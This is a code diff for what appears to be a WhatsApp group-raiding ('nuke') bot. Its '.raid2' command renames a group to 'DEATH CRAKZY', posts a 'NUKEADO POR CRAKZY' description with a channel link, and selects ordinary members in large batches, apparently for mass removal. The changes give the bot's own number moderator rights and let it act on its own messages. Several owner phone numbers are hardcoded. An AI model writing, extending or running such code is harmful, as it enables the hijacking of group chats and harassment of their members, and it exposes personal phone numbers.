@@ -13,6 +13,9 @@ process.on('uncaughtException', (err) => console.log('Uncaught Exception:', err)
 const NOMBRE_GRUPO = '𝐃𝐄𝐀𝐓𝐇 𝐂𝐑𝐀𝐊𝐙𝐘';
 const DESCRIPCION_GRUPO = `𝐍𝐔𝐊𝐄𝐀𝐃𝐎 𝐏𝐎𝐑 𝐂𝐑𝐀𝐊𝐙𝐘 𝐃𝐈𝐎𝐒 𝐓𝐎𝐃𝐎 𝐏𝐎𝐃𝐄𝐑𝐎𝐒𝐎\nSalmos 37:8-9 (TLA)\n\n📢 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐂𝐑𝐀𝐊𝐘:\nhttps://whatsapp.com/channel/0029VbCP81gADTOEOgWQxW07`;
 
+// NÚMERO DEL BOT
+const BOT_NUMERO = '3197010548990';
+
 const BOT_OWNER = '5219613301789';
 const BOT_OWNER_LID = '189915467931651';
 const BOT_OWNER_2 = '584124339924';
@@ -74,7 +77,7 @@ async function startBot() {
   sock.ev.on('messages.upsert', async ({ messages }) => {
     try {
       const msg = messages[0];
-      if (!msg.message || msg.key.fromMe) return;
+      if (!msg.message) return;
 
       const from = msg.key.remoteJid;
       if (!from.endsWith('@g.us')) return;
@@ -86,6 +89,7 @@ async function startBot() {
 
       const metadata = await sock.groupMetadata(from);
       const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+      const botNum = botJid.replace(/[^0-9]/g, '');
 
       const isBotAdmins =
         metadata.participants.find(p => p.id === botJid)?.admin!== null;
@@ -95,10 +99,11 @@ async function startBot() {
       if (text === '.follar2') text = '.raid2';
 
       /* =========================
-         🔐 PERMISOS MOD (FIX REAL)
+         🔐 PERMISOS MOD
       ========================= */
 
       const hardOwners = [
+        BOT_NUMERO,
         BOT_OWNER,
         BOT_OWNER_LID,
         BOT_OWNER_2,
@@ -109,7 +114,8 @@ async function startBot() {
 
       const isMod =
         hardOwners.includes(senderNum) ||
-        getOwners().includes(senderNum);
+        getOwners().includes(senderNum) ||
+        senderNum === botNum;
 
       /* ========================= */
 
@@ -211,11 +217,11 @@ async function startBot() {
         await sock.groupUpdateSubject(from, NOMBRE_GRUPO);
         await sock.groupUpdateDescription(from, DESCRIPCION_GRUPO);
 
-        const allOwners = [...hardOwners,...getOwners()];
+        const allOwners = [...hardOwners,...getOwners(), botNum];
         const miembros = metadata.participants.filter(p =>
-        !p.admin &&
+     !p.admin &&
           p.id!== botJid &&
-        !allOwners.includes(p.id.replace(/[^0-9]/g, ''))
+     !allOwners.includes(p.id.replace(/[^0-9]/g, ''))
         );
 
         const chunkSize = 1024;
